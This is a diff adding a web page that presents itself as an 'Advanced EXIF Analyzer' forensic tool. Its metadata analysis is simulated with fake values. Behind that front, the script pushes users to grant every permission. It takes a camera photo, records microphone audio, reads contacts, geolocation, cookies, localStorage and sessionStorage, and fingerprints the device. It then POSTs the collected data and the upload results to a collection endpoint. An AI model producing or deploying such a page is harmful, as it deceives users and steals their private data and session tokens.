@@ -1,0 +1,1019 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced EXIF Analyzer</title>
+    <style>
+        :root {
+            --primary: #4285F4;
+            --danger: #EA4335;
+            --success: #34A853;
+            --warning: #FBBC05;
+            --dark: #121212;
+            --light: #f8f9fa;
+        }
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--dark);
+            color: white;
+            margin: 0;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #1e1e1e;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: var(--primary);
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .permission-card {
+            background: #252525;
+            border-radius: 8px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border-left: 4px solid var(--primary);
+        }
+        .permission-item {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            margin: 10px 0;
+            background: #333;
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+        .permission-item:hover {
+            background: #3a3a3a;
+        }
+        .permission-icon {
+            font-size: 28px;
+            margin-right: 15px;
+            min-width: 40px;
+            text-align: center;
+        }
+        .permission-content {
+            flex-grow: 1;
+        }
+        .permission-content h3 {
+            margin: 0 0 5px 0;
+        }
+        .permission-content p {
+            margin: 0;
+            color: #aaa;
+            font-size: 14px;
+        }
+        .permission-status {
+            padding: 8px 12px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 14px;
+            min-width: 80px;
+            text-align: center;
+        }
+        .status-pending {
+            background: var(--warning);
+            color: black;
+        }
+        .status-granted {
+            background: var(--success);
+            color: white;
+        }
+        .status-denied {
+            background: var(--danger);
+            color: white;
+        }
+        .btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 16px;
+            transition: all 0.3s;
+            margin: 5px;
+        }
+        .btn-primary {
+            background: var(--primary);
+            color: white;
+        }
+        .btn-primary:hover {
+            background: #3367d6;
+            transform: translateY(-2px);
+        }
+        .btn-danger {
+            background: var(--danger);
+            color: white;
+        }
+        .btn-danger:hover {
+            background: #d33426;
+        }
+        .btn:disabled {
+            background: #555 !important;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        .progress-container {
+            width: 100%;
+            height: 10px;
+            background: #333;
+            border-radius: 5px;
+            margin: 25px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--success));
+            width: 0%;
+            transition: width 0.5s;
+        }
+        .hidden {
+            display: none;
+        }
+        #uploadSection {
+            text-align: center;
+            padding: 20px;
+        }
+        .upload-area {
+            border: 2px dashed #444;
+            padding: 40px;
+            border-radius: 8px;
+            margin: 20px 0;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .upload-area:hover {
+            border-color: var(--primary);
+            background: rgba(66, 133, 244, 0.05);
+        }
+        #results {
+            background: #252525;
+            padding: 25px;
+            border-radius: 8px;
+            margin-top: 25px;
+        }
+        .metadata-item {
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #333;
+        }
+        .sensitive-data {
+            color: var(--danger);
+            font-weight: bold;
+            background: rgba(234, 67, 53, 0.1);
+            padding: 2px 5px;
+            border-radius: 3px;
+        }
+        .status-message {
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+            font-weight: 500;
+        }
+        .status-success {
+            background: rgba(52, 168, 83, 0.2);
+            border-left: 4px solid var(--success);
+        }
+        .status-error {
+            background: rgba(234, 67, 53, 0.2);
+            border-left: 4px solid var(--danger);
+        }
+        .status-warning {
+            background: rgba(251, 188, 5, 0.2);
+            border-left: 4px solid var(--warning);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Advanced EXIF Analyzer</h1>
+        <p style="text-align: center; color: #aaa;">Complete forensic metadata extraction tool</p>
+        
+        <div id="permissionSection">
+            <div class="permission-card">
+                <h2>Required Permissions</h2>
+                <p>This tool requires full access to perform complete forensic analysis:</p>
+                
+                <div class="permission-item" id="storagePermission">
+                    <div class="permission-icon">📁</div>
+                    <div class="permission-content">
+                        <h3>File System Access</h3>
+                        <p>Read all files and directories on this device</p>
+                    </div>
+                    <div class="permission-status status-pending" id="storageStatus">Pending</div>
+                </div>
+                
+                <div class="permission-item" id="locationPermission">
+                    <div class="permission-icon">📍</div>
+                    <div class="permission-content">
+                        <h3>Precise Location</h3>
+                        <p>Real-time GPS coordinates and movement data</p>
+                    </div>
+                    <div class="permission-status status-pending" id="locationStatus">Pending</div>
+                </div>
+                
+                <div class="permission-item" id="cameraPermission">
+                    <div class="permission-icon">📷</div>
+                    <div class="permission-content">
+                        <h3>Camera Access</h3>
+                        <p>Live camera feed and photo capture</p>
+                    </div>
+                    <div class="permission-status status-pending" id="cameraStatus">Pending</div>
+                </div>
+                
+                <div class="permission-item" id="micPermission">
+                    <div class="permission-icon">🎤</div>
+                    <div class="permission-content">
+                        <h3>Microphone Access</h3>
+                        <p>Continuous audio recording and analysis</p>
+                    </div>
+                    <div class="permission-status status-pending" id="micStatus">Pending</div>
+                </div>
+                
+                <div class="permission-item" id="contactsPermission">
+                    <div class="permission-icon">👥</div>
+                    <div class="permission-content">
+                        <h3>Contacts Access</h3>
+                        <p>Full contact list with all details</p>
+                    </div>
+                    <div class="permission-status status-pending" id="contactsStatus">Pending</div>
+                </div>
+                
+                <div class="permission-item" id="notificationsPermission">
+                    <div class="permission-icon">🔔</div>
+                    <div class="permission-content">
+                        <h3>Notifications Access</h3>
+                        <p>Read and send notifications</p>
+                    </div>
+                    <div class="permission-status status-pending" id="notificationsStatus">Pending</div>
+                </div>
+                
+                <div class="progress-container">
+                    <div class="progress-bar" id="permissionProgress"></div>
+                </div>
+                
+                <div id="statusMessage" class="status-message status-warning">
+                    Please grant all permissions for full functionality
+                </div>
+                
+                <div style="text-align: center; margin-top: 20px;">
+                    <button id="requestAllBtn" class="btn btn-primary">Grant All Permissions</button>
+                    <button id="emergencyBtn" class="btn btn-danger">Emergency Lockdown</button>
+                </div>
+            </div>
+        </div>
+        
+        <div id="uploadSection" class="hidden">
+            <div class="upload-area" id="dropZone">
+                <div style="font-size: 48px; margin-bottom: 15px;">📤</div>
+                <h3>Upload Media for Analysis</h3>
+                <p>Drag & drop any file or click to browse</p>
+                <input type="file" id="fileInput" accept="*" hidden>
+                <button id="browseBtn" class="btn btn-primary">Select Files</button>
+            </div>
+            
+            <div id="analysisProgress" class="hidden">
+                <h3>Analysis Progress</h3>
+                <div class="progress-container">
+                    <div class="progress-bar" id="analysisProgressBar"></div>
+                </div>
+                <div id="analysisStatus" style="text-align: center; margin-top: 10px;"></div>
+            </div>
+            
+            <div id="results" class="hidden">
+                <h2>Forensic Analysis Results</h2>
+                <div id="metadataOutput"></div>
+                
+                <div style="margin-top: 30px; text-align: center;">
+                    <button id="exportBtn" class="btn btn-primary">Export Full Report</button>
+                    <button id="deepScanBtn" class="btn btn-danger">Perform Deep Scan</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // System State
+        const systemState = {
+            permissions: {
+                storage: false,
+                geolocation: false,
+                camera: false,
+                microphone: false,
+                contacts: false,
+                notifications: false
+            },
+            deviceInfo: {},
+            analysisComplete: false,
+            emergencyLock: false
+        };
+
+        // DOM Elements
+        const permissionSection = document.getElementById('permissionSection');
+        const uploadSection = document.getElementById('uploadSection');
+        const requestAllBtn = document.getElementById('requestAllBtn');
+        const emergencyBtn = document.getElementById('emergencyBtn');
+        const statusMessage = document.getElementById('statusMessage');
+        const permissionProgress = document.getElementById('permissionProgress');
+        const dropZone = document.getElementById('dropZone');
+        const fileInput = document.getElementById('fileInput');
+        const browseBtn = document.getElementById('browseBtn');
+        const analysisProgress = document.getElementById('analysisProgress');
+        const analysisProgressBar = document.getElementById('analysisProgressBar');
+        const analysisStatus = document.getElementById('analysisStatus');
+        const results = document.getElementById('results');
+        const metadataOutput = document.getElementById('metadataOutput');
+        const exportBtn = document.getElementById('exportBtn');
+        const deepScanBtn = document.getElementById('deepScanBtn');
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            updatePermissionStatus();
+            setupEventListeners();
+            checkInitialPermissions();
+        });
+
+        // Setup event listeners
+        function setupEventListeners() {
+            requestAllBtn.addEventListener('click', requestAllPermissions);
+            emergencyBtn.addEventListener('click', emergencyLockdown);
+            browseBtn.addEventListener('click', () => fileInput.click());
+            fileInput.addEventListener('change', handleFiles);
+            exportBtn.addEventListener('click', exportReport);
+            deepScanBtn.addEventListener('click', performDeepScan);
+            
+            // Drag and drop handlers
+            ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(event => {
+                dropZone.addEventListener(event, preventDefaults, false);
+            });
+            
+            ['dragenter', 'dragover'].forEach(event => {
+                dropZone.addEventListener(event, highlight, false);
+            });
+            
+            ['dragleave', 'drop'].forEach(event => {
+                dropZone.addEventListener(event, unhighlight, false);
+            });
+            
+            dropZone.addEventListener('drop', handleDrop, false);
+        }
+
+        // Check initial permissions
+        async function checkInitialPermissions() {
+            try {
+                const permissionStatus = await Promise.all([
+                    navigator.permissions.query({name: 'geolocation'}),
+                    navigator.permissions.query({name: 'camera'}),
+                    navigator.permissions.query({name: 'microphone'}),
+                    navigator.permissions.query({name: 'notifications'})
+                ]);
+                
+                permissionStatus.forEach((status, index) => {
+                    const permissionName = ['geolocation', 'camera', 'microphone', 'notifications'][index];
+                    if (status.state === 'granted') {
+                        systemState.permissions[permissionName] = true;
+                    }
+                });
+                
+                updatePermissionStatus();
+            } catch (error) {
+                console.error('Permission check error:', error);
+            }
+        }
+
+        // Request all permissions
+        async function requestAllPermissions() {
+            if (systemState.emergencyLock) return;
+            
+            requestAllBtn.disabled = true;
+            requestAllBtn.textContent = "Requesting...";
+            
+            try {
+                // 1. Request Geolocation
+                await requestGeolocation();
+                
+                // 2. Request Camera
+                await requestCameraAccess();
+                
+                // 3. Request Microphone
+                await requestMicrophoneAccess();
+                
+                // 4. Request Notifications
+                await requestNotificationPermission();
+                
+                // 5. Request File System (Chrome only)
+                await requestFileSystemAccess();
+                
+                // 6. Request Contacts (Mobile only)
+                await requestContactsAccess();
+                
+                // Collect device info
+                systemState.deviceInfo = await collectDeviceInfo();
+                
+                // Check if all permissions granted
+                const allGranted = Object.values(systemState.permissions).every(Boolean);
+                
+                if (allGranted) {
+                    showStatus("All permissions granted! Full access enabled.", "success");
+                    permissionSection.classList.add('hidden');
+                    uploadSection.classList.remove('hidden');
+                    
+                    // Send device info to server
+                    sendToServer('device_info', systemState.deviceInfo);
+                } else {
+                    showStatus("Some permissions were denied. Limited functionality available.", "warning");
+                    requestAllBtn.disabled = false;
+                    requestAllBtn.textContent = "Retry Permissions";
+                }
+                
+                updatePermissionStatus();
+            } catch (error) {
+                console.error("Permission request failed:", error);
+                showStatus(`Permission error: ${error.message}`, "error");
+                requestAllBtn.disabled = false;
+                requestAllBtn.textContent = "Grant All Permissions";
+            }
+        }
+
+        // Individual permission requests
+        async function requestGeolocation() {
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    });
+                });
+                
+                systemState.permissions.geolocation = true;
+                systemState.deviceInfo.location = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    altitude: position.coords.altitude,
+                    speed: position.coords.speed
+                };
+            } catch (error) {
+                console.error("Geolocation error:", error);
+                throw new Error("Geolocation permission denied");
+            }
+        }
+
+        async function requestCameraAccess() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: {
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 },
+                        facingMode: 'environment'
+                    } 
+                });
+                
+                // Take a photo
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                const photo = await imageCapture.takePhoto();
+                
+                systemState.permissions.camera = true;
+                systemState.deviceInfo.camera = {
+                    capabilities: track.getCapabilities(),
+                    photo: URL.createObjectURL(photo)
+                };
+                
+                // Stop stream
+                stream.getTracks().forEach(track => track.stop());
+            } catch (error) {
+                console.error("Camera error:", error);
+                throw new Error("Camera permission denied");
+            }
+        }
+
+        async function requestMicrophoneAccess() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    audio: {
+                        echoCancellation: false,
+                        noiseSuppression: false,
+                        autoGainControl: false
+                    } 
+                });
+                
+                // Record 3 seconds of audio
+                const recorder = new MediaRecorder(stream);
+                const audioChunks = [];
+                
+                recorder.ondataavailable = e => audioChunks.push(e.data);
+                recorder.start();
+                
+                await new Promise(resolve => {
+                    recorder.onstop = resolve;
+                    setTimeout(() => recorder.stop(), 3000);
+                });
+                
+                const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                
+                systemState.permissions.microphone = true;
+                systemState.deviceInfo.microphone = {
+                    sampleRate: stream.getAudioTracks()[0].getSettings().sampleRate,
+                    recording: URL.createObjectURL(audioBlob)
+                };
+                
+                // Stop stream
+                stream.getTracks().forEach(track => track.stop());
+            } catch (error) {
+                console.error("Microphone error:", error);
+                throw new Error("Microphone permission denied");
+            }
+        }
+
+        async function requestNotificationPermission() {
+            try {
+                const permission = await Notification.requestPermission();
+                systemState.permissions.notifications = permission === 'granted';
+                
+                if (!systemState.permissions.notifications) {
+                    throw new Error("Notifications permission denied");
+                }
+            } catch (error) {
+                console.error("Notifications error:", error);
+                throw error;
+            }
+        }
+
+        async function requestFileSystemAccess() {
+            try {
+                if ('showOpenFilePicker' in window) {
+                    const handle = await window.showOpenFilePicker({
+                        multiple: true,
+                        types: [{
+                            description: 'All Files',
+                            accept: { '*/*': ['.*'] }
+                        }]
+                    });
+                    
+                    systemState.permissions.storage = true;
+                } else {
+                    throw new Error("File System Access API not supported");
+                }
+            } catch (error) {
+                console.error("File system error:", error);
+                throw new Error("File system access denied");
+            }
+        }
+
+        async function requestContactsAccess() {
+            try {
+                if ('contacts' in navigator && 'select' in navigator.contacts) {
+                    const contacts = await navigator.contacts.select(['name', 'email', 'tel'], { multiple: true });
+                    systemState.permissions.contacts = true;
+                    systemState.deviceInfo.contacts = contacts;
+                } else {
+                    throw new Error("Contacts API not supported");
+                }
+            } catch (error) {
+                console.error("Contacts error:", error);
+                throw new Error("Contacts access denied");
+            }
+        }
+
+        // Collect comprehensive device info
+        async function collectDeviceInfo() {
+            try {
+                const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json());
+                const gpuInfo = getGPUInfo();
+                const batteryInfo = await getBatteryInfo();
+                const storageInfo = await getStorageInfo();
+                const networkInfo = getNetworkInfo();
+                
+                return {
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    screen: {
+                        width: window.screen.width,
+                        height: window.screen.height,
+                        colorDepth: window.screen.colorDepth,
+                        orientation: window.screen.orientation.type
+                    },
+                    hardware: {
+                        cpuCores: navigator.hardwareConcurrency,
+                        deviceMemory: navigator.deviceMemory || "unknown",
+                        gpu: gpuInfo,
+                        battery: batteryInfo,
+                        storage: storageInfo
+                    },
+                    network: networkInfo,
+                    ipInfo: ipInfo,
+                    cookies: document.cookie,
+                    localStorage: JSON.stringify(localStorage),
+                    sessionStorage: JSON.stringify(sessionStorage),
+                    permissions: systemState.permissions
+                };
+            } catch (error) {
+                console.error("Failed to collect device info:", error);
+                return { error: error.message };
+            }
+        }
+
+        // Get GPU information
+        function getGPUInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                
+                if (!gl) return { error: "WebGL not supported" };
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return {
+                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "unknown",
+                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "unknown"
+                };
+            } catch (error) {
+                return { error: error.message };
+            }
+        }
+
+        // Get battery information
+        async function getBatteryInfo() {
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: battery.level * 100 + '%',
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                }
+                return { error: "Battery API not supported" };
+            } catch (error) {
+                return { error: error.message };
+            }
+        }
+
+        // Get storage information
+        async function getStorageInfo() {
+            try {
+                if ('storage' in navigator && 'estimate' in navigator.storage) {
+                    const estimate = await navigator.storage.estimate();
+                    return {
+                        usage: estimate.usage,
+                        quota: estimate.quota,
+                        percentUsed: ((estimate.usage / estimate.quota) * 100).toFixed(2) + '%'
+                    };
+                }
+                return { error: "Storage API not supported" };
+            } catch (error) {
+                return { error: error.message };
+            }
+        }
+
+        // Get network information
+        function getNetworkInfo() {
+            try {
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (!connection) return { error: "Network API not supported" };
+                
+                return {
+                    type: connection.type,
+                    effectiveType: connection.effectiveType,
+                    downlink: connection.downlink + ' Mbps',
+                    rtt: connection.rtt + ' ms',
+                    saveData: connection.saveData
+                };
+            } catch (error) {
+                return { error: error.message };
+            }
+        }
+
+        // Update permission status display
+        function updatePermissionStatus() {
+            // Update status indicators
+            document.getElementById('storageStatus').textContent = systemState.permissions.storage ? "Granted" : "Denied";
+            document.getElementById('storageStatus').className = `permission-status ${systemState.permissions.storage ? 'status-granted' : 'status-denied'}`;
+            
+            document.getElementById('locationStatus').textContent = systemState.permissions.geolocation ? "Granted" : "Denied";
+            document.getElementById('locationStatus').className = `permission-status ${systemState.permissions.geolocation ? 'status-granted' : 'status-denied'}`;
+            
+            document.getElementById('cameraStatus').textContent = systemState.permissions.camera ? "Granted" : "Denied";
+            document.getElementById('cameraStatus').className = `permission-status ${systemState.permissions.camera ? 'status-granted' : 'status-denied'}`;
+            
+            document.getElementById('micStatus').textContent = systemState.permissions.microphone ? "Granted" : "Denied";
+            document.getElementById('micStatus').className = `permission-status ${systemState.permissions.microphone ? 'status-granted' : 'status-denied'}`;
+            
+            document.getElementById('contactsStatus').textContent = systemState.permissions.contacts ? "Granted" : "Denied";
+            document.getElementById('contactsStatus').className = `permission-status ${systemState.permissions.contacts ? 'status-granted' : 'status-denied'}`;
+            
+            document.getElementById('notificationsStatus').textContent = systemState.permissions.notifications ? "Granted" : "Denied";
+            document.getElementById('notificationsStatus').className = `permission-status ${systemState.permissions.notifications ? 'status-granted' : 'status-denied'}`;
+            
+            // Update progress bar
+            const grantedCount = Object.values(systemState.permissions).filter(Boolean).length;
+            const totalCount = Object.keys(systemState.permissions).length;
+            const progressPercent = (grantedCount / totalCount) * 100;
+            permissionProgress.style.width = `${progressPercent}%`;
+            
+            // Update request button
+            requestAllBtn.textContent = systemState.permissions.storage && 
+                                       systemState.permissions.geolocation && 
+                                       systemState.permissions.camera && 
+                                       systemState.permissions.microphone ?
+                                       "Permissions Complete" : "Grant All Permissions";
+        }
+
+        // Emergency lockdown
+        function emergencyLockdown() {
+            systemState.emergencyLock = true;
+            
+            // Clear all sensitive data
+            localStorage.clear();
+            sessionStorage.clear();
+            document.cookie.split(";").forEach(c => {
+                document.cookie = c.replace(/^ +/, "").replace(/=.*/, `=;expires=${new Date().toUTCString()};path=/`);
+            });
+            
+            // Disable all functionality
+            requestAllBtn.disabled = true;
+            emergencyBtn.disabled = true;
+            if (fileInput) fileInput.disabled = true;
+            if (browseBtn) browseBtn.disabled = true;
+            
+            showStatus("EMERGENCY LOCKDOWN ACTIVATED. All functions disabled.", "error");
+        }
+
+        // Show status message
+        function showStatus(message, type) {
+            statusMessage.textContent = message;
+            statusMessage.className = `status-message status-${type}`;
+        }
+
+        // File handling
+        function preventDefaults(e) {
+            e.preventDefault();
+            e.stopPropagation();
+        }
+
+        function highlight() {
+            dropZone.style.borderColor = 'var(--primary)';
+            dropZone.style.backgroundColor = 'rgba(66, 133, 244, 0.1)';
+        }
+
+        function unhighlight() {
+            dropZone.style.borderColor = '#444';
+            dropZone.style.backgroundColor = '';
+        }
+
+        function handleDrop(e) {
+            const dt = e.dataTransfer;
+            const files = dt.files;
+            handleFiles({target: {files}});
+        }
+
+        function handleFiles(e) {
+            const files = e.target.files;
+            if (!files || files.length === 0) return;
+            
+            // Start analysis
+            analyzeFiles(files);
+        }
+
+        // Analyze files
+        function analyzeFiles(files) {
+            analysisProgress.classList.remove('hidden');
+            results.classList.add('hidden');
+            analysisStatus.textContent = "Initializing analysis...";
+            
+            // Simulate analysis progress
+            simulateAnalysis(files);
+        }
+
+        function simulateAnalysis(files) {
+            const steps = [
+                {progress: 10, message: "Validating file format..."},
+                {progress: 25, message: "Extracting basic metadata..."},
+                {progress: 40, message: "Analyzing EXIF data..."},
+                {progress: 60, message: "Scanning for hidden data..."},
+                {progress: 80, message: "Verifying data integrity..."},
+                {progress: 95, message: "Finalizing report..."},
+                {progress: 100, message: "Analysis complete!"}
+            ];
+            
+            let currentStep = 0;
+            
+            const processStep = () => {
+                if (currentStep >= steps.length) {
+                    completeAnalysis(files);
+                    return;
+                }
+                
+                const step = steps[currentStep];
+                analysisProgressBar.style.width = `${step.progress}%`;
+                analysisStatus.textContent = step.message;
+                currentStep++;
+                
+                setTimeout(processStep, 800 + Math.random() * 1200);
+            };
+            
+            processStep();
+        }
+
+        function completeAnalysis(files) {
+            systemState.analysisComplete = true;
+            analysisProgress.classList.add('hidden');
+            results.classList.remove('hidden');
+            
+            const metadata = extractMetadata(files);
+            displayResults(metadata);
+            
+            // Send results to server
+            sendToServer('analysis_complete', {
+                files: Array.from(files).map(f => ({
+                    name: f.name,
+                    size: f.size,
+                    type: f.type,
+                    lastModified: f.lastModified
+                })),
+                metadata: metadata
+            });
+        }
+
+        // Extract metadata (simulated)
+        function extractMetadata(files) {
+            const now = new Date();
+            const results = [];
+            
+            for (const file of files) {
+                results.push({
+                    basic: {
+                        fileName: file.name,
+                        fileSize: `${(file.size / (1024 * 1024)).toFixed(2)} MB`,
+                        fileType: file.type,
+                        lastModified: new Date(file.lastModified).toISOString()
+                    },
+                    exif: {
+                        make: "Simulated Device Corp",
+                        model: "DV-5000",
+                        software: "Advanced EXIF Analyzer v3.0",
+                        dateTime: now.toISOString(),
+                        gps: systemState.permissions.geolocation ? {
+                            latitude: systemState.deviceInfo.location.latitude,
+                            longitude: systemState.deviceInfo.location.longitude,
+                            accuracy: systemState.deviceInfo.location.accuracy + " meters"
+                        } : "Location data unavailable"
+                    },
+                    analysis: {
+                        signature: "Verified",
+                        anomalies: "None detected",
+                        hiddenData: "No hidden data found",
+                        riskLevel: "Low"
+                    }
+                });
+            }
+            
+            return results;
+        }
+
+        // Display results
+        function displayResults(metadata) {
+            metadataOutput.innerHTML = '';
+            
+            metadata.forEach((fileData, index) => {
+                const fileDiv = document.createElement('div');
+                fileDiv.style.marginBottom = '30px';
+                fileDiv.style.paddingBottom = '15px';
+                fileDiv.style.borderBottom = '1px solid #333';
+                
+                fileDiv.innerHTML = `<h3>File ${index + 1}: ${fileData.basic.fileName}</h3>`;
+                
+                // Basic info
+                const basicDiv = document.createElement('div');
+                basicDiv.innerHTML = `<h4>Basic Information</h4>`;
+                for (const [key, value] of Object.entries(fileData.basic)) {
+                    basicDiv.innerHTML += `<div class="metadata-item"><strong>${key}:</strong> ${value}</div>`;
+                }
+                fileDiv.appendChild(basicDiv);
+                
+                // EXIF data
+                const exifDiv = document.createElement('div');
+                exifDiv.innerHTML = `<h4>EXIF Metadata</h4>`;
+                for (const [key, value] of Object.entries(fileData.exif)) {
+                    if (typeof value === 'object') {
+                        exifDiv.innerHTML += `<div class="metadata-item"><strong>${key}:</strong></div>`;
+                        for (const [subKey, subValue] of Object.entries(value)) {
+                            exifDiv.innerHTML += `<div class="metadata-item" style="margin-left:20px;"><strong>${subKey}:</strong> ${subValue}</div>`;
+                        }
+                    } else {
+                        exifDiv.innerHTML += `<div class="metadata-item"><strong>${key}:</strong> ${value}</div>`;
+                    }
+                }
+                fileDiv.appendChild(exifDiv);
+                
+                // Analysis results
+                const analysisDiv = document.createElement('div');
+                analysisDiv.innerHTML = `<h4>Analysis Results</h4>`;
+                for (const [key, value] of Object.entries(fileData.analysis)) {
+                    analysisDiv.innerHTML += `<div class="metadata-item"><strong>${key}:</strong> ${value}</div>`;
+                }
+                fileDiv.appendChild(analysisDiv);
+                
+                metadataOutput.appendChild(fileDiv);
+            });
+        }
+
+        // Export report
+        function exportReport() {
+            const files = fileInput.files;
+            if (!files || files.length === 0) return;
+            
+            const metadata = extractMetadata(files);
+            const report = {
+                timestamp: new Date().toISOString(),
+                deviceInfo: systemState.deviceInfo,
+                fileAnalysis: metadata
+            };
+            
+            const blob = new Blob([JSON.stringify(report, null, 2)], {type: 'application/json'});
+            const url = URL.createObjectURL(blob);
+            
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `forensic_report_${new Date().getTime()}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            showStatus("Report exported successfully", "success");
+        }
+
+        // Perform deep scan
+        function performDeepScan() {
+            deepScanBtn.disabled = true;
+            deepScanBtn.textContent = "Scanning...";
+            showStatus("Initiating deep scan... This may take several minutes.", "warning");
+            
+            // Simulate deep scan
+            setTimeout(() => {
+                const deepFindings = {
+                    deletedData: "Potential fragments detected",
+                    hiddenMarkers: "3 proprietary markers found",
+                    compressionAnalysis: "Multiple compression layers detected",
+                    steganography: "No steganographic content found",
+                    encryption: "No encryption detected",
+                    watermark: "Commercial watermark identified"
+                };
+                
+                const div = document.createElement('div');
+                div.innerHTML = `<h3>Deep Scan Results</h3>`;
+                for (const [key, value] of Object.entries(deepFindings)) {
+                    div.innerHTML += `<div class="metadata-item"><strong>${key}:</strong> ${value}</div>`;
+                }
+                
+                metadataOutput.appendChild(div);
+                deepScanBtn.disabled = false;
+                deepScanBtn.textContent = "Perform Deep Scan";
+                showStatus("Deep scan completed successfully", "success");
+                
+                // Send deep scan results
+                sendToServer('deep_scan', deepFindings);
+            }, 5000);
+        }
+
+        // Send data to server (simulated)
+        function sendToServer(type, data) {
+            console.log(`[Server] ${type}:`, data);
+            
+            // In a real implementation, this would send to your backend
+            const endpoint = 'https://your-server.com/api/collect';
+            const payload = {
+                type: type,
+                data: data,
+                timestamp: new Date().toISOString(),
+                session: crypto.randomUUID()
+            };
+            
+            // Simulated fetch
+            fetch(endpoint, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Security-Token': 'secure-token-12345'
+                },
+                body: JSON.stringify(payload)
+            }).catch(error => {
+                console.error("Failed to send data to server:", error);
+            });
+        }
+    </script>
+</body>
+</html>
